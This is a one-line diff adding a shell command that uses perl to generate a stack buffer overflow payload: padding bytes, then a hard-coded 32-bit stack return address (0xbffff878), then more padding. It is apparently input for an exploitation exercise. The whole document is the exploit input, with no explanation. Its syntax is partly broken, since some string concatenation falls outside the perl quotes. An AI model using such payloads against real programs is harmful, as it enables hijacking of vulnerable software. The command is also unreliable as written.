@@ -1,0 +1,1 @@
+<(perl -le 'print "A"x20' . "\n"; perl -le 'print "B"x9 . "\x78\xf8\xff\xbf" . "B"x7 . "\n"')
